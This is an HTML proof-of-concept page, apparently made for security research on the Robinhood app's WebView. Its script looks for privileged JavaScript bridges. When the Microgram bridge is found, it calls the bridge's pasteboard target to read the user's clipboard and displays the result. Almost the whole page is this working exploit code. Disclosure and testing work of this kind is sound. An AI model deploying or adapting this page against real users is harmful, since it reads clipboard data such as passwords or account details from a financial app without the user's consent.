<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Robinhood WebView Bridge Test</title>
  <style>
    body {
      background: #000;
      color: #0f0;
      font-family: monospace;
      padding: 20px;
    }
    .ok { color: #0f0; }
    .warn { color: orange; }
    .bad { color: red; }
    .box {
      border: 1px solid #0f0;
      padding: 10px;
      margin-top: 10px;
    }
  </style>
</head>
<body>

<h1>[+] Robinhood Bridge Test</h1>
<div id="results">Running checks...</div>

<script>
function log(msg, cls="ok") {
  const el = document.createElement("div");
  el.className = cls;
  el.innerText = msg;
  document.getElementById("results").appendChild(el);
}

function testBridges() {
  let found = false;

  // Microgram bridge
  if (window._microgramEntryPoint) {
    log("[CRITICAL] _microgramEntryPoint FOUND", "bad");
    found = true;

    try {
      const channel = new MessageChannel();
      channel.port1.onmessage = (event) => {
        try {
          const res = JSON.parse(event.data);
          log("[+] Clipboard access response:", "warn");

          const box = document.createElement("div");
          box.className = "box";
          box.innerText = res.payload;
          document.body.appendChild(box);
        } catch(e) {
          log("[-] Failed parsing response", "warn");
        }
      };

      window._microgramEntryPoint.postMessage(JSON.stringify({
        target: "mg.ui.pasteboard#implementation",
        messageId: "test",
        payload: "{}",
        wantsReply: true,
        isReply: false
      }), [channel.port2]);

    } catch (e) {
      log("[-] Bridge call failed: " + e.message, "warn");
    }
  }

  // Generic Android bridge
  if (window.android || window.Android) {
    log("[HIGH] Android JS interface detected", "warn");
    found = true;
  }

  // Sprig / UserLeap check
  if (window.sprig || window.userleap) {
    log("[HIGH] Sprig/UserLeap bridge detected", "warn");
    found = true;
  }

  if (!found) {
    log("[SAFE] No privileged bridge detected", "ok");
  }
}

// Delay slightly to allow bridge injection
setTimeout(testBridges, 1000);
</script>

</body>
</html>
